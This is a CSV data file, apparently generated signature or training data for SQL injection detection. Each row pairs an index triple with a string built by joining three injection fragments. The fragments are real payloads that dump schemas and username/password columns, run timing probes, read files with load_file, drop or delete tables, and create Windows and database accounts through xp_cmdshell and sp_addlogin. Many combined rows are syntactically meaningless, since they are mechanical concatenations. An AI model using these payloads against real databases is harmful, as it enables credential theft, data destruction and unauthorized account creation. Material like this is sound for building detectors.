sig_vector,sig_string
"[56, 41, 1]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)exec master.dbo.sp_addlogin username') or"
"[78, 54, 81]"," = 1 union select 1,2,3  /*union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 create table test like users;"
"[78, 1, 35]"," = 1 union select 1,2,3  /*') or delete table dirs "
"[56, 51, 1]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3') or"
"[29, 47, 78]"," drop database dbunion select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  = 1 union select 1,2,3  /*"
"[8, 47, 76]","and( union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  ;insert into users(id,username,password) values('100','new','new');"
"[11, 54, 82]"," ) or union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 drop table sc3；"
"[6, 32, 66]"," 1)) or  union select 1,2,(database()) ;--"
"[15, 3, 78]"," and 1=2 '')) or = 1 union select 1,2,3  /*"
"[15, 51, 81]"," and 1=2 union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 create table test like users;"
"[44, 57, 81]","create table dirs(paths varchar(100), id int)union select 1,@@datadir,3 create table test like users;"
"[2, 36, 21]",‘ (select @@version） select * from users where id=1 
"[19, 32, 50]"," or'1'='1 union select 1,2,(database())  1 = 2 union all select user() "
"[11, 5, 82]", ) or ) and  drop table sc3；
"[78, 47, 81]"," = 1 union select 1,2,3  /*union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  create table test like users;"
"[78, 51, 81]"," = 1 union select 1,2,3  /*union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 create table test like users;"
"[6, 36, 23]"," 1)) or  (select @@version） union select 1,username,password from users where id=2"
"[2, 1, 78]","‘') or = 1 union select 1,2,3  /*"
"[78, 36, 35]"," = 1 union select 1,2,3  /* (select @@version） delete table dirs "
"[78, 78, 35]"," = 1 union select 1,2,3  /* = 1 union select 1,2,3  /* delete table dirs "
"[29, 1, 78]"," drop database db') or = 1 union select 1,2,3  /*"
"[2, 78, 78]","‘ = 1 union select 1,2,3  /* = 1 union select 1,2,3  /*"
"[11, 47, 82]"," ) or union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  drop table sc3；"
"[17, 54, 78]"," ' and 1=2union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 = 1 union select 1,2,3  /*"
"[5, 54, 11]",") and union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 ) or "
"[6, 47, 25]"," 1)) or union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  updatexml(1,concat(0x7e,(select @@version),0x7e),1) "
"[6, 26, 78]"," 1)) or  union select 1,1,1,load_file(c:\\boot.ini) 
 = 1 union select 1,2,3  /*"
"[68, 36, 81]", */ (select @@version） create table test like users;
"[78, 78, 81]"," = 1 union select 1,2,3  /* = 1 union select 1,2,3  /* create table test like users;"
"[78, 54, 13]"," = 1 union select 1,2,3  /*union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 admin'"
"[6, 51, 82]"," 1)) or union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 drop table sc3；"
"[44, 27, 78]","create table dirs(paths varchar(100), id int) select * from users where id=1 = 1 union select 1,2,3  /*"
"[6, 47, 82]"," 1)) or union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  drop table sc3；"
"[37, 47, 78]"," WAITFOR DELAY '0:0:5'union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  = 1 union select 1,2,3  /*"
"[6, 47, 23]"," 1)) or union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  union select 1,username,password from users where id=2"
"[78, 43, 35]"," = 1 union select 1,2,3  /*exec master.dbo.xp_cmdshell 'net user username password /add' delete table dirs "
"[6, 54, 51]"," 1)) or union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[56, 47, 1]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 ') or"
"[22, 62, 78]"," union select 1,2 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= = 1 union select 1,2,3  /*"
"[78, 51, 35]"," = 1 union select 1,2,3  /*union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 delete table dirs "
"[56, 44, 62]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)create table dirs(paths varchar(100), id int) 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[29, 51, 78]"," drop database dbunion select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 = 1 union select 1,2,3  /*"
"[78, 54, 35]"," = 1 union select 1,2,3  /*union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 delete table dirs "
"[78, 78, 13]"," = 1 union select 1,2,3  /* = 1 union select 1,2,3  /* admin'"
"[78, 51, 13]"," = 1 union select 1,2,3  /*union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 admin'"
"[56, 19, 15]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) or'1'='1 and 1=2 "
"[29, 54, 51]"," drop database dbunion select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[26, 54, 47]"," union select 1,1,1,load_file(c:\\boot.ini) 
union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 "
"[15, 34, 78]"," and 1=2  INSERT INTO = 1 union select 1,2,3  /*"
"[22, 36, 35]"," union select 1,2 (select @@version） delete table dirs "
"[78, 44, 13]"," = 1 union select 1,2,3  /*create table dirs(paths varchar(100), id int) admin'"
"[6, 51, 23]"," 1)) or union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 union select 1,username,password from users where id=2"
"[78, 47, 35]"," = 1 union select 1,2,3  /*union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  delete table dirs "
"[56, 78, 1]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) = 1 union select 1,2,3  /*') or"
"[51, 51, 82]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 drop table sc3；"
"[6, 47, 26]"," 1)) or union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  union select 1,1,1,load_file(c:\\boot.ini) 
"
"[32, 47, 5]"," union select 1,2,(database()) union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 ) and "
"[78, 47, 10]"," = 1 union select 1,2,3  /*union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  +"
"[6, 47, 14]"," 1)) or union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  or "
"[6, 23, 23]"," 1)) or  union select 1,username,password from users where id=2 union select 1,username,password from users where id=2"
"[6, 47, 66]"," 1)) or union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 ;--"
"[78, 5, 20]"," = 1 union select 1,2,3  /*) and  exists (select * from sysobjects)"
"[32, 47, 6]"," union select 1,2,(database()) union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  1)) or "
"[56, 56, 65]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) ) --"
"[6, 55, 78]"," 1)) or  order by 1 = 1 union select 1,2,3  /*"
"[59, 1, 78]"," (select count(*) from admin where len(*)>0)') or = 1 union select 1,2,3  /*"
"[14, 51, 82]"," or union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 drop table sc3；"
"[6, 51, 65]"," 1)) or union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 ) --"
"[6, 41, 78]"," 1)) or exec master.dbo.sp_addlogin username = 1 union select 1,2,3  /*"
"[62, 40, 78]"," 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=(select IS_MEMBER('db_owner')) = 1 union select 1,2,3  /*"
"[78, 53, 54]"," = 1 union select 1,2,3  /* if(length(database())=8,sleep(5),1)union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[51, 54, 82]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 drop table sc3；"
"[32, 51, 6]"," union select 1,2,(database()) union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 1)) or "
"[54, 47, 1]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 ') or"
"[56, 11, 1]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) ) or ') or"
"[51, 33, 35]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 exec master..xp_cmdshell ' delete table dirs "
"[6, 51, 7]"," 1)) or union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3and 0 ><"
"[78, 51, 80]"," = 1 union select 1,2,3  /*union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 and 1=1;"
"[56, 47, 31]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  benchmark(3000000,MD5(1))"
"[5, 54, 9]",") and union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 1 or "
"[57, 25, 36]","union select 1,@@datadir,3 updatexml(1,concat(0x7e,(select @@version),0x7e),1)  (select @@version）"
"[50, 49, 1]"," 1 = 2 union all select user()  union select 1,2,load_file('C://1.txt')') or"
"[32, 51, 67]"," union select 1,2,(database()) union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3';--"
"[6, 36, 82]", 1)) or  (select @@version） drop table sc3；
"[0, 3, 1]",'' or'')) or') or
"[6, 6, 80]", 1)) or  1)) or  and 1=1;
"[21, 47, 78]"," select * from users where id=1 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  = 1 union select 1,2,3  /*"
"[6, 51, 62]"," 1)) or union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[78, 78, 80]"," = 1 union select 1,2,3  /* = 1 union select 1,2,3  /* and 1=1;"
"[54, 47, 61]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  1=(select name from master.dbo.sysdatabases where id=1)"
"[17, 24, 26]"," ' and 1=2 1=(if((user() regexp '^r'),1,0)) union select 1,1,1,load_file(c:\\boot.ini) 
"
"[51, 53, 82]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 if(length(database())=8,sleep(5),1) drop table sc3；"
"[33, 24, 7]"," exec master..xp_cmdshell ' 1=(if((user() regexp '^r'),1,0))and 0 ><"
"[18, 54, 78]"," &&union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 = 1 union select 1,2,3  /*"
"[51, 47, 82]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  drop table sc3；"
"[13, 34, 78]"," admin' INSERT INTO = 1 union select 1,2,3  /*"
"[78, 78, 10]"," = 1 union select 1,2,3  /* = 1 union select 1,2,3  /* +"
"[47, 62, 78]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= = 1 union select 1,2,3  /*"
"[56, 51, 69]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3#"
"[6, 13, 35]", 1)) or  admin' delete table dirs 
"[19, 36, 31]"," or'1'='1 (select @@version） benchmark(3000000,MD5(1))"
"[53, 51, 78]"," if(length(database())=8,sleep(5),1)union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 = 1 union select 1,2,3  /*"
"[32, 21, 78]"," union select 1,2,(database())  select * from users where id=1  = 1 union select 1,2,3  /*"
"[34, 16, 47]"," INSERT INTO and union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 "
"[6, 62, 82]", 1)) or  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= drop table sc3；
"[47, 47, 78]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  = 1 union select 1,2,3  /*"
"[47, 51, 78]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 = 1 union select 1,2,3  /*"
"[43, 54, 82]","exec master.dbo.xp_cmdshell 'net user username password /add'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 drop table sc3；"
"[7, 36, 9]",and 0 >< (select @@version） 1 or 
"[32, 56, 4]"," union select 1,2,(database()) union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)' and "
"[36, 54, 38]"," (select @@version）union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 (select Count(*) from table)>0"
"[32, 57, 6]"," union select 1,2,(database()) union select 1,@@datadir,3 1)) or "
"[32, 42, 6]"," union select 1,2,(database()) exec master.dbo.sp_password null,username,password 1)) or "
"[6, 51, 39]"," 1)) or union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3(select IS_SRVROLEMEMBER('sysadmin'))"
"[57, 47, 0]","union select 1,@@datadir,3union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 '' or"
"[47, 6, 78]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  1)) or  = 1 union select 1,2,3  /*"
"[47, 37, 78]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  WAITFOR DELAY '0:0:5' = 1 union select 1,2,3  /*"
"[51, 82, 27]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 drop table sc3； select * from users where id=1"
"[32, 47, 72]"," union select 1,2,(database()) union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  = 2 --"
"[56, 5, 67]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)) and ';--"
"[27, 47, 6]"," select * from users where id=1union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  1)) or "
"[47, 22, 51]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  union select 1,2union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[47, 34, 70]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  INSERT INTO>0 --"
"[29, 62, 78]"," drop database db 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= = 1 union select 1,2,3  /*"
"[47, 47, 34]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  INSERT INTO"
"[49, 51, 23]"," union select 1,2,load_file('C://1.txt')union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 union select 1,username,password from users where id=2"
"[32, 36, 9]"," union select 1,2,(database())  (select @@version） 1 or "
"[2, 57, 78]","‘union select 1,@@datadir,3 = 1 union select 1,2,3  /*"
"[63, 36, 77]",1 (select @@version） ;delete from user_data;
"[0, 62, 22]","'' or 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= union select 1,2"
"[8, 36, 51]","and(  (select @@version）union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[32, 2, 6]"," union select 1,2,(database()) ‘ 1)) or "
"[6, 51, 70]"," 1)) or union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3>0 --"
"[41, 51, 82]","exec master.dbo.sp_addlogin usernameunion select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 drop table sc3；"
"[56, 19, 65]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) or'1'='1 ) --"
"[40, 51, 23]","(select IS_MEMBER('db_owner'))union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 union select 1,username,password from users where id=2"
"[23, 22, 82]"," union select 1,username,password from users where id=2 union select 1,2 drop table sc3；"
"[78, 61, 78]"," = 1 union select 1,2,3  /* 1=(select name from master.dbo.sysdatabases where id=1) = 1 union select 1,2,3  /*"
"[51, 62, 82]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= drop table sc3；"
"[6, 51, 38]"," 1)) or union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 (select Count(*) from table)>0"
"[57, 51, 33]","union select 1,@@datadir,3union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 exec master..xp_cmdshell '"
"[47, 36, 53]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version） if(length(database())=8,sleep(5),1)"
"[56, 7, 1]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)and 0 ><') or"
"[78, 52, 19]"," = 1 union select 1,2,3  /* sleep(5) or'1'='1"
"[11, 51, 36]"," ) or union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 (select @@version）"
"[32, 57, 21]"," union select 1,2,(database()) union select 1,@@datadir,3 select * from users where id=1 "
"[50, 47, 36]"," 1 = 2 union all select user() union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version）"
"[3, 51, 33]","'')) orunion select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 exec master..xp_cmdshell '"
"[55, 51, 82]"," order by 1union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 drop table sc3；"
"[51, 51, 64]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3--"
"[18, 51, 78]"," &&union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 = 1 union select 1,2,3  /*"
"[32, 29, 1]"," union select 1,2,(database())  drop database db') or"
"[78, 51, 64]"," = 1 union select 1,2,3  /*union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3--"
"[57, 57, 5]","union select 1,@@datadir,3union select 1,@@datadir,3) and "
"[55, 47, 6]"," order by 1union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  1)) or "
"[47, 3, 82]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 '')) or drop table sc3；"
"[6, 51, 6]"," 1)) or union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 1)) or "
"[22, 29, 6]"," union select 1,2 drop database db 1)) or "
"[11, 32, 35]"," ) or  union select 1,2,(database())  delete table dirs "
"[56, 51, 56]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)"
"[39, 51, 1]","(select IS_SRVROLEMEMBER('sysadmin'))union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3') or"
"[6, 35, 82]", 1)) or  delete table dirs  drop table sc3；
"[13, 24, 82]"," admin' 1=(if((user() regexp '^r'),1,0)) drop table sc3；"
"[50, 51, 36]"," 1 = 2 union all select user() union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 (select @@version）"
"[54, 19, 37]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 or'1'='1 WAITFOR DELAY '0:0:5'"
"[59, 62, 78]"," (select count(*) from admin where len(*)>0) 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= = 1 union select 1,2,3  /*"
"[47, 20, 26]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  exists (select * from sysobjects) union select 1,1,1,load_file(c:\\boot.ini) 
"
"[11, 62, 56]"," ) or  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)"
"[50, 47, 0]"," 1 = 2 union all select user() union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 '' or"
"[11, 82, 44]"," ) or  drop table sc3；create table dirs(paths varchar(100), id int)"
"[41, 47, 81]","exec master.dbo.sp_addlogin usernameunion select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  create table test like users;"
"[56, 51, 0]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3'' or"
"[78, 21, 1]"," = 1 union select 1,2,3  /* select * from users where id=1 ') or"
"[22, 56, 1]"," union select 1,2union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)') or"
"[62, 47, 7]"," 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 and 0 ><"
"[51, 47, 40]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 (select IS_MEMBER('db_owner'))"
"[48, 51, 82]","(select user_name())union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 drop table sc3；"
"[47, 18, 78]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  && = 1 union select 1,2,3  /*"
"[6, 78, 47]"," 1)) or  = 1 union select 1,2,3  /*union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 "
"[1, 11, 22]","') or ) or  union select 1,2"
"[47, 62, 54]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[6, 62, 80]", 1)) or  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= and 1=1;
"[6, 51, 72]"," 1)) or union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 = 2 --"
"[47, 57, 78]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,@@datadir,3 = 1 union select 1,2,3  /*"
"[47, 57, 54]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,@@datadir,3union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[47, 51, 19]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 or'1'='1"
"[47, 82, 39]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  drop table sc3；(select IS_SRVROLEMEMBER('sysadmin'))"
"[56, 51, 50]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 1 = 2 union all select user() "
"[31, 47, 23]"," benchmark(3000000,MD5(1))union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  union select 1,username,password from users where id=2"
"[6, 51, 49]"," 1)) or union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 union select 1,2,load_file('C://1.txt')"
"[11, 47, 36]"," ) or union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version）"
"[47, 26, 78]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  union select 1,1,1,load_file(c:\\boot.ini) 
 = 1 union select 1,2,3  /*"
"[47, 62, 19]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= or'1'='1"
"[2, 47, 47]","‘union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 "
"[16, 62, 47]"," and  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 "
"[56, 58, 54]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA) (select count(*) from sysobjects)union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[3, 36, 64]",'')) or (select @@version）--
"[47, 20, 62]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  exists (select * from sysobjects) 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[50, 57, 54]"," 1 = 2 union all select user() union select 1,@@datadir,3union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[56, 43, 62]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)exec master.dbo.xp_cmdshell 'net user username password /add' 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[61, 51, 1]"," 1=(select name from master.dbo.sysdatabases where id=1)union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3') or"
